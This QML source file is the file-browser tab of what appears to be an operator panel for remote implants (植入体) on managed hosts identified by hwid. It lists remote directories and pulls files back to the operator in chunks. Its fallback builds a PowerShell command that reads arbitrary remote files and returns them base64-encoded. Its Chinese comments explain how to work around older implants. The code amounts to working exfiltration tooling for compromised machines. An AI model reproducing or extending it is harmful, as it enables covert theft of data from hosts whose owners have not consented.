import QtQuick
import QtQuick.Controls
import QtQuick.Layouts
import ui

Rectangle {
    id: fileTab
    property string serverUrl: ""
    property string cookie: ""
    property string hwid: ""
    property string currentPath: "/"
    property string notice: ""
    color: "transparent"

    ColumnLayout {
        anchors.fill: parent; anchors.margins: Theme.spacingM; spacing: Theme.spacingS

        // 导航栏
        RowLayout {
            Layout.fillWidth: true; spacing: 8
            Button { text: "⬆"; onClicked: fileTab.goParent(); enabled: fileTab.parentPath !== "" || fileTab.currentPath !== "/" }
            TextField { id: pathInput; Layout.fillWidth: true; text: fileTab.currentPath; font.pixelSize: 13
            Accessible.name: "远端路径 " + text
                onAccepted: navigateTo(text) }
            Button { text: "🔄"; onClicked: navigateTo(pathInput.text) }
            Item { Layout.fillWidth: true }
            Button { text: "📤 投放本机文件"; onClicked: uploadFile();
                     Accessible.name: "投放本机文件" }
            Button { text: "📥 读回本机"; onClicked: pullFile(); enabled: selectedRow >= 0
                     Accessible.name: "读回本机" }
            Button { text: "🗑 删除"; onClicked: deleteFile(); enabled: selectedRow >= 0
                     Accessible.name: "删除远端文件" }
        }

        // 操作反馈：让"未实现/失败"变成可见信息
        Text {
            Layout.fillWidth: true
            visible: fileTab.notice.length > 0
            text: fileTab.notice
            // （同理路径框也补了名）。这让"文件页为什么是空的"能自证，而不是靠猜。
            Accessible.role: Accessible.StaticText
            Accessible.name: "文件页提示 " + fileTab.notice
            color: Theme.orange
            font.pixelSize: 12
            wrapMode: Text.WordWrap
        }

        // 文件列表
        Rectangle {
            Layout.fillWidth: true; Layout.fillHeight: true
            color: Theme.bgSecondary; radius: Theme.radiusS; border.color: Qt.rgba(0,0,0,0.06)

            ListView {
                id: fileListView
                anchors.fill: parent; clip: true; spacing: 1
                model: ListModel { id: fileModel }

                // 表头：外层的 1px 分隔线不能放在 RowLayout 里面
                // （RowLayout 的子项由布局管理，再写 anchors 是未定义行为，
                //   Qt 会刷 "Detected anchors on an item that is managed by a layout"）
                header: Rectangle {
                    width: fileListView.width; height: 32
                    color: "transparent"
                    Rectangle {
                        width: parent.width; height: 1
                        anchors.bottom: parent.bottom
                        color: Qt.rgba(0,0,0,0.06)
                    }
                    RowLayout {
                        anchors.fill: parent
                        Text { text: "名称"; Layout.preferredWidth: parent.width * 0.5; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary; leftPadding: 8 }
                        Text { text: "大小"; Layout.preferredWidth: parent.width * 0.2; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary }
                        Text { text: "类型"; Layout.preferredWidth: parent.width * 0.3; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary }
                    }
                }

                delegate: Rectangle {
                    width: fileListView.width; height: 36
                    property bool isHovered: delegateMouse.containsMouse
                    property bool isSelected: fileTab.selectedRow === index
                    color: isSelected ? Qt.rgba(10/255,132/255,255/255,0.12) : isHovered ? Qt.rgba(0,0,0,0.03) : "transparent"

                    RowLayout {
                        anchors.fill: parent; anchors.leftMargin: 8; spacing: 0
                        Text { text: model.isDir ? "📁 " + model.name : "📄 " + model.name; width: parent.width * 0.5; font.pixelSize: 13; color: Theme.textPrimary; elide: Text.ElideRight }
                        Text { text: model.isDir ? "-" : formatSize(model.size); width: parent.width * 0.2; font.pixelSize: 12; color: Theme.textSecondary }
                        Text { text: model.isDir ? "文件夹" : "文件"; width: parent.width * 0.3; font.pixelSize: 12; color: Theme.textTertiary }
                    }
                    MouseArea {
                        id: delegateMouse; anchors.fill: parent; hoverEnabled: true
                        onClicked: fileTab.selectedRow = index
                        onDoubleClicked: {
                            if (model.isDir) navigateTo(fileTab.currentPath === "/" ? "/" + model.name : fileTab.currentPath + "/" + model.name)
                        }
                    }
                }
            }
        }
    }

    property int selectedRow: -1

    // ── 读回远端文件（分块）的状态 ──
    property string pullRemote: ""
    property string pullLocal: ""
    property int    pullOffset: 0
    property int    pullBytes: 0
    property bool   pullBusy: false
    readonly property int pullChunk: 30000        // powershell 回落模式的块大小
    // 读回模式：read_file = 植入体内建工具（一次 1MB，快）；
    //          powershell = 老植入体没有内建工具时的回落（30KB/块，慢但在）
    property string pullMode: "read_file"   // read_file(插件)  read_file_native(内建)  powershell
    property string parentPath: ""          // list_dir 回的上级路径（用于 ⬆）
    property var    drives: []
    property int    pullBigChunk: 1048576

    function formatSize(bytes) {
        if (bytes < 1024) return bytes + " B"
        if (bytes < 1048576) return (bytes/1024).toFixed(1) + " KB"
        return (bytes/1048576).toFixed(1) + " MB"
    }

    function navigateTo(path) {
        if (!hwid) return
        currentPath = path
        pathInput.text = path
        fileModel.clear()
        selectedRow = -1
        // 工具名必须是 list_dir —— 面板原来写的是 list_directory（不存在），
        mcp.callTool(hwid, serverUrl, cookie, "list_dir",
                     JSON.stringify({ path: path, show_hidden: true }), "file")
    }

    function navigateUp() {
        var parts = currentPath.split("/")
        parts.pop()
        navigateTo(parts.join("/") || "/")
    }

    // ── 读回远端文件（保存到本机）──
    // 这里**不需要**受管端有 file_manager 插件：走已经装好的 shell_exec 里的 powershell 工具，
    // 分块把内容 base64 取回来，再由 C++（api.saveBase64Chunk）逐块写成本机文件。
    // 为什么这么绕而不改植入体：改植入体要重编 + 重过兼容性适配流水线，而这条路零改动就能用。
    function pullFile() {
        if (!hwid) { notice = "先在左侧选一个受管端"; return }
        if (pullBusy) { notice = "正在取回中，先等它结束"; return }
        if (selectedRow >= 0) {
            var f = fileModel.get(selectedRow)
            if (!f || f.isDir) { notice = "文件夹不能直接取回（进目录后取里面的具体文件）"; return }
            pullRemote = (currentPath === "/") ? ("/" + f.name) : (currentPath + "/" + f.name)
        } else {
            // 列表空着时也要能用：文件列表依赖 list_directory 工具，而本项目没有附带
            // 当远端文件完整路径用。这是当前最可靠、零额外 UI 的入口。
            var typed = pathInput.text.trim()
            if (typed === "" || typed === "/" || typed.charAt(typed.length - 1) === "/") {
                notice = "先在列表里选一个文件，或在上面的路径框里直接填远端文件的完整路径（如 C:/Users/user"
                return
            }
            pullRemote = typed.replace(/\\/g, "/")
        }
        var path = api.pickSaveFile("保存到本机（读回远端文件：" + pullRemote + "）", pullRemote.split("/").pop())
        if (!path || path === "") { notice = "已取消保存"; return }
        beginPull(path)
    }

    function beginPull(path) {
        pullLocal = path
        pullMode = "read_file"   // 每次先试内建工具，不行再回落
        pullOffset = 0
        pullBytes = 0
        pullBusy = true
        notice = "开始取回 " + pullRemote + " …（每块 30KB，大文件会慢）"
        requestChunk()
    }


    // 取一块。远端用 PowerShell 直接 Read 指定偏移的字节再 base64，
    // 不走 type/cat —— 二进制会坏，且管道会做编码转换。
    function requestChunk() {
        if (pullMode === "read_file") {
            // 插件 file_browser 的 read_file：**必须显式 mode=base64** ——
            mcp.callTool(hwid, serverUrl, cookie, "read_file",
                JSON.stringify({ path: pullRemote, offset: pullOffset,
                                 max_bytes: pullBigChunk, mode: "base64" }), "pull")
            return
        }
        if (pullMode === "read_file_native") {
            mcp.callTool(hwid, serverUrl, cookie, "read_file_native",
                JSON.stringify({ path: pullRemote, offset: pullOffset, length: pullBigChunk }), "pull")
            return
        }
        var q = pullRemote.replace(/'/g, "''")
        var n = pullChunk
        var ps = "$f=[IO.File]::OpenRead('" + q + "');try{"
               + "$f.Seek(" + pullOffset + ",'Begin')|Out-Null;"
               + "$b=New-Object byte[] " + n + ";"
               + "$k=$f.Read($b,0," + n + ");"
               + "[Console]::Out.Write([Convert]::ToBase64String($b,0,$k))"
               + "}finally{$f.Close()}"
        mcp.callTool(hwid, serverUrl, cookie, "powershell", JSON.stringify({ command: ps }), "pull")
    }

    // 结果可能是三种形状：内建工具的裸对象 / 插件的 content[0].text / 裸字符串
    function pullParse(result) {
        if (result === undefined || result === null) return { error: "空结果" }
        var o = null
        try { o = JSON.parse(result) } catch (e) { return { raw: String(result) } }
        if (typeof o === "string") {
            try { o = JSON.parse(o) } catch (e2) { return { raw: o } }
        }
        if (o && o.error !== undefined) return { error: String(o.error) }
        if (o && o.base64 !== undefined) return { b64: String(o.base64), eof: o.eof === true, length: o.length }
        if (o && o.content && o.content.length > 0 && o.content[0] && o.content[0].text !== undefined) {
            // 插件路径：外面是 JSON-RPC 信封，里面才是工具自己的 JSON
            var inner = String(o.content[0].text)
            try {
                var o2 = JSON.parse(inner)
                if (o2 && o2.error !== undefined) return { error: String(o2.error) }
                if (o2 && o2.base64 !== undefined)
                    return { b64: String(o2.base64), eof: o2.eof === true, length: o2.length }
            } catch (e) { }
            return { raw: inner }
        }
        return { raw: String(result) }
    }

    // 工具返回可能是 {"content":[{"text":"..."}]}，也可能是裸字符串 —— 两种都要认
    function extractText(result) {
        if (result === undefined || result === null) return ""
        var o = null
        try { o = JSON.parse(result) } catch (e) { return String(result) }
        if (typeof o === "string") return o
        if (o.error !== undefined) return "__ERR__" + o.error
        if (o.content && o.content.length > 0 && o.content[0] && o.content[0].text !== undefined)
            return String(o.content[0].text)
        return String(result)
    }

    function finishPull(msg) {
        pullBusy = false
        notice = msg
    }

    // ⬆ 用 list_dir 回的 parent（比字符串裁剪可靠：盘根/UNC/尾斜杠都不会错）
    function goParent() {
        if (parentPath && parentPath !== "") navigateTo(parentPath)
        else navigateUp()
    }

    // 读回结果处理：插件(JSON-RPC 两层) 与 内建(裸对象) 两种形状都要认
    function handlePull(result) {
        if (!pullBusy) return
        var pr = pullParse(result)
        if (pr.error !== undefined) {
            if (pr.error.indexOf("no plugin provides tool") >= 0) {
                if (pullMode === "read_file") {
                    pullMode = "read_file_native"
                    notice = "插件 read_file 不可用，改用植入体内建 read_file_native"
                    requestChunk(); return
                }
                if (pullMode === "read_file_native") {
                    pullMode = "powershell"
                    notice = "内建工具也不可用，回落到 powershell 分块（较慢）"
                    requestChunk(); return
                }
            }
            finishPull("取回失败：" + pr.error)
            return
        }
        var b64 = ""
        var done = false
        if (pr.b64 !== undefined) { b64 = pr.b64; done = (pr.eof === true) || (Number(pr.length) === 0) }
        else { b64 = String(pr.raw === undefined ? "" : pr.raw) }
        if (b64.length === 0) {
            finishPull("取回结束：已保存 " + pullBytes + " 字节到 " + pullLocal)
            return
        }
        var err = api.saveBase64Chunk(pullLocal, b64, pullOffset > 0)
        if (err !== "") { finishPull("写本机文件失败：" + err); return }
        var got = (pr.length !== undefined) ? Number(pr.length) : Math.floor(b64.length * 3 / 4)
        pullBytes += got
        if (done || got === 0) {
            finishPull("已读回并保存到本机：" + pullLocal + "（" + pullBytes + " 字节，模式 " + pullMode + "）")
        } else {
            pullOffset += got
            notice = "取回中… 已 " + pullBytes + " 字节（" + pullMode + "）"
            requestChunk()
        }
    }

    // 写/删这两个仍然没有对端原语：写入的最佳路径是「投放页」选本机文件（会自动上传+投放），
    // 删除需要远端"移到回收站"的原语（直接 Remove-Item 是永久删除，不做）。
    function uploadFile() {
        notice = "投放到受管端请用「投放」页的「📂 选本机文件…」—— 会自动上传并填好表单"
    }
    function deleteFile() {
        notice = "远端删除未实现：需要一个「移到回收站」的原语（直接永久删除是铁律禁止的）"
    }


    // 消费 list_directory 的结果：原来整个文件没有任何 Connections，
    // fileModel 只 clear 不 append，文件页永远是空的
    Connections {
        target: mcp
        function onToolResult(tool, result, source) {
            // 读回文件的分块结果（原内联实现已抽成 handlePull）
            if (source === "pull") { handlePull(result); return }
            if (source !== "file" && tool !== "list_dir") return
            var obj = null
            try { obj = JSON.parse(result) } catch (e) { notice = "结果解析失败: " + result; return }
            if (obj.error !== undefined) { notice = "[error] " + obj.error; return }
            // 实测形状：{"content":[{"text":"<内层 JSON>"}],"id":N,"jsonrpc":"2.0"}
            // 内层：{ok, path, parent, drives, count, entries:[{name,is_dir,size,mod_time}]}
            var inner = obj
            if (obj.content && obj.content.length > 0 && obj.content[0] && obj.content[0].text !== undefined) {
                try { inner = JSON.parse(obj.content[0].text) } catch (e) { inner = null }
            }
            if (!inner || inner.entries === undefined) {
                notice = "list_dir 返回里没有 entries（形状变了？）：" + String(result).slice(0, 160)
                return
            }
            if (inner.path) { currentPath = inner.path; pathInput.text = inner.path }
            parentPath = inner.parent || ""
            drives = inner.drives || []
            fileModel.clear()
            var list = inner.entries
            for (var i = 0; i < list.length; ++i) {
                var f = list[i]
                fileModel.append({ name: f.name, size: f.size || 0,
                                   isDir: f.is_dir === true, modTime: f.mod_time || "" })
            }
            selectedRow = -1
            notice = "已列出 " + fileModel.count + " 项（" + currentPath + "）"
        }
    }
}
